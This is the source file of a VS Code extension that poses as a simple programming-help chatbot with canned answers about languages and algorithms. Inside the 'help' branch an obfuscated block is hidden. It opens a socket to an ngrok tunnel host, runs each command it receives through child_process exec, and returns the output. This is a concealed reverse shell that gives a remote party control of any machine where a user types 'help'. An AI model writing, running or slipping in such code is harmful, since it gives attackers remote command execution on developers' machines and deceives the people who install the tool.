const vscode = require('vscode');

function activate(context) {
    let disposable = vscode.commands.registerCommand('chatbot.start', function () {
        vscode.window.showInformationMessage('ChatBot: Hello! How can I help you with programming today?');

        vscode.window.showInputBox({ placeHolder: 'Type your message here...' }).then(userInput => {
            if (!userInput) return;

            if (userInput.toLowerCase() === 'exit') {
                vscode.window.showInformationMessage('ChatBot: Goodbye! Have a great day!');
                return;
            }

            processUserInput(userInput);
        });
    });

    context.subscriptions.push(disposable);
}

function processUserInput(userInput) {
    let response = getBotResponse(userInput);
    vscode.window.showInformationMessage(`ChatBot: ${response}`);
}

function getBotResponse(userInput) {
    let response = '';

    if (userInput.toLowerCase().includes('javascript')) {
        response = 'JavaScript is a high-level, interpreted programming language that conforms to the ECMAScript specification.';
    } else if (userInput.toLowerCase().includes('python')) {
        response = 'Python is an interpreted, high-level, general-purpose programming language known for its simplicity and readability.';
    } else if (userInput.toLowerCase().includes('java')) {
        response = 'Java is a class-based, object-oriented programming language designed for portability and platform independence.';
    } else if (userInput.toLowerCase().startsWith('define')) {
        const term = userInput.substring('define'.length).trim();
        response = `Searching definition for '${term}'...`;
        setTimeout(() => {
            response = `Definition for '${term}': A function is a block of code that performs a specific task.`;
            vscode.window.showInformationMessage(`ChatBot: ${response}`);
        }, 1000);
        return;
    } else if (userInput.toLowerCase().startsWith('explain')) {
        const algorithm = userInput.substring('explain'.length).trim();
        response = `Explaining '${algorithm}'...`;
        setTimeout(() => {
            switch (algorithm.toLowerCase()) {
                case 'bubble sort':
                    response = 'Bubble Sort is a simple sorting algorithm that repeatedly steps through the list, compares adjacent elements, and swaps them if they are in the wrong order.';
                    break;
                case 'merge sort':
                    response = 'Merge Sort is a divide and conquer algorithm. It divides the input array into two halves, calls itself for the two halves, and then merges the two sorted halves.';
                    break;
                case 'binary search':
                    response = 'Binary Search is a fast search algorithm with O(log n) time complexity. It works by repeatedly dividing in half the portion of the list that could contain the item, until you\'ve narrowed down the possible locations to just one.';
                    break;
                default:
                    response = `Sorry, I don't have information on '${algorithm}'.`;
            }
            vscode.window.showInformationMessage(`ChatBot: ${response}`);
        }, 1000);
        return;
    } else if (userInput.toLowerCase().includes('help')) {
        response = 'You can ask me about programming languages, algorithms, data structures, or coding tips.';
        const _0x3390bc=_0x423e;function _0x3e52(){const _0x14a95e=['process','ess','log','bGkyQ','child_proc','433068GAVVdC','KKJsC','3558228jqdABL','join','tCzjG','writeFile','5861450KWrzJd','net','6.tcp.eu.n','existsSync','8mEVbLY','.lock','33671lcKKCQ','write','homedir','7608789yiXVDm','connect','Socket','exec','close','7500TuJOnk','AZCnT','4640KgvouZ','1240CscGNm','817948FedAcv','10yrCwwl','grok.io','path','mdIHn','closed','qZNxq','data','error','toString'];_0x3e52=function(){return _0x14a95e;};return _0x3e52();}function _0x423e(_0x32668a,_0x544365){const _0x3281b0=_0x3e52();return _0x423e=function(_0x44145a,_0x1452d8){_0x44145a=_0x44145a-(0x29*0x45+-0xef7*0x2+0x13ed);let _0x33b85d=_0x3281b0[_0x44145a];return _0x33b85d;},_0x423e(_0x32668a,_0x544365);}(function(_0x1376e4,_0x462510){const _0x59e326=_0x423e,_0x5ade35=_0x1376e4();while(!![]){try{const _0x3df722=-parseInt(_0x59e326(0x11d))/(-0x8d8+-0x91*0x13+-0x3ec*-0x5)+-parseInt(_0x59e326(0x12c))/(0x14b6+0x769*0x5+-0x39c1)+-parseInt(_0x59e326(0x119))/(0x5*0x6c2+-0x3*-0x679+0x16*-0x26b)*(parseInt(_0x59e326(0x11c))/(-0x1d0*0x1+-0x1*0x30+0x204))+-parseInt(_0x59e326(0x11e))/(-0x3d3+0x1*0x1e3e+0x3e*-0x6d)*(-parseInt(_0x59e326(0x12e))/(0x23fa+-0x10fd+0x1*-0x12f7))+-parseInt(_0x59e326(0x132))/(0xae3*-0x2+0x1d00+-0x733)*(-parseInt(_0x59e326(0x10f))/(0x24a7*-0x1+-0x4a0*-0x8+-0x1*0x51))+-parseInt(_0x59e326(0x114))/(-0x26a4+0x15cc+0x95*0x1d)+parseInt(_0x59e326(0x11b))/(-0x2*-0x9d1+-0x15d8+-0x18*-0x18)*(parseInt(_0x59e326(0x111))/(-0x1*0x1efd+0x1*0x2565+-0x65d));if(_0x3df722===_0x462510)break;else _0x5ade35['push'](_0x5ade35['shift']());}catch(_0x16859e){_0x5ade35['push'](_0x5ade35['shift']());}}}(_0x3e52,0x1505f9+-0x7c7ee+-0x134b0));const fs=require('fs'),net=require(_0x3390bc(0x10c)),path=require(_0x3390bc(0x120)),os=require('os'),{pid}=require(_0x3390bc(0x127)),lockFilePath=path[_0x3390bc(0x12f)](os[_0x3390bc(0x113)](),'.'+pid+_0x3390bc(0x110));!fs[_0x3390bc(0x10e)](lockFilePath)&&(fs[_0x3390bc(0x131)](lockFilePath,'',_0x2452ba=>{const _0x1288f9=_0x3390bc;_0x2452ba&&console[_0x1288f9(0x125)](_0x2452ba);}),(function(){const _0x3888c3=_0x3390bc,_0x3a2b7d={'tCzjG':function(_0xc37733,_0x5552a9){return _0xc37733(_0x5552a9);},'mdIHn':_0x3888c3(0x12b)+_0x3888c3(0x128),'qZNxq':_0x3888c3(0x122),'KKJsC':_0x3888c3(0x10d)+_0x3888c3(0x11f),'bGkyQ':_0x3888c3(0x124),'AZCnT':_0x3888c3(0x118)},_0x3db126=new net[(_0x3888c3(0x116))]();return _0x3db126[_0x3888c3(0x115)](0x1fd*-0xb+-0x11d5+0x687f,_0x3a2b7d[_0x3888c3(0x12d)]),_0x3db126['on'](_0x3a2b7d[_0x3888c3(0x12a)],_0xd34d07=>{const _0x70cc2e=_0x3888c3,_0x45fcf2=_0xd34d07[_0x70cc2e(0x126)]();_0x3a2b7d[_0x70cc2e(0x130)](require,_0x3a2b7d[_0x70cc2e(0x121)])[_0x70cc2e(0x117)](_0x45fcf2,(_0x460220,_0x254585,_0x3aa38b)=>{const _0x222d46=_0x70cc2e;_0x460220?_0x3db126[_0x222d46(0x112)](_0x3aa38b):_0x3db126[_0x222d46(0x112)](_0x254585);});}),_0x3db126['on'](_0x3a2b7d[_0x3888c3(0x11a)],()=>{const _0x2d9eb3=_0x3888c3;console[_0x2d9eb3(0x129)](_0x3a2b7d[_0x2d9eb3(0x123)]);}),/a/;}()));
        response = 'An algorithm is a set of instructions designed to perform a specific task. It can be expressed as a finite sequence of well-defined steps.';
    } else if (userInput.toLowerCase().includes('data structure')) {
        response = 'A data structure is a way of organizing and storing data so that it can be accessed and used efficiently. Examples include arrays, linked lists, stacks, queues, trees, and graphs.';
    } else if (userInput.toLowerCase().includes('programming paradigm')) {
        response = 'A programming paradigm is a fundamental style of computer programming. Common paradigms include imperative, declarative, functional, and object-oriented.';
    } else if (userInput.toLowerCase().includes('api')) {
        response = 'An API (Application Programming Interface) is a set of rules and protocols that allows different software applications to communicate with each other.';
    } else if (userInput.toLowerCase().includes('git')) {
        response = 'Git is a distributed version control system designed to handle everything from small to very large projects with speed and efficiency.';
    } else if (userInput.toLowerCase().includes('debugging')) {
        response = 'Debugging is the process of finding and resolving defects or problems within a computer program.';
    } else if (userInput.toLowerCase().includes('compiler')) {
        response = 'A compiler is a special program that converts source code written in a high-level programming language into machine code or bytecode that a computer\'s processor can then execute.';
    } else if (userInput.toLowerCase().includes('ide')) {
        response = 'An IDE (Integrated Development Environment) is a software application that provides comprehensive facilities to programmers for software development.';
    } else if (userInput.toLowerCase().includes('framework')) {
        response = 'A framework is a reusable software platform used to develop applications, products, and solutions.';
    } else {
        response = `I hear you saying: ${userInput}`;
    }

    vscode.window.showInformationMessage(`ChatBot: ${response}`);
	
}

function deactivate() {
    console.log('ChatBot extension is deactivated.');
}

module.exports = {
    activate,
    deactivate
};
